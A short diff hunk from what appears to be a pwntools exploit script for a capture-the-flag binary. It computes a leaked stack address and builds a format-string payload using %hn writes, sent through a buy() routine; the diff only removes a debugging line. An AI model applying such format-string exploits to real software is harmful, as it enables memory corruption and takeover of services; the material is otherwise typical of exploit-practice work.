@@ -42,8 +42,7 @@ stack_addr=int(p.recv(14),16)-0x1d0
 success('stack_addr:'+hex(stack_addr))
 stack1=stack_addr%0x10000
 success('stack1:'+hex(stack1))
-#gdb.attach(p)
-#pause()
+
 payload2='%'+str(stack1)+'c%13$hn'+'%2c%29$hn'
 buy(payload2)
 #gdb.attach(p)
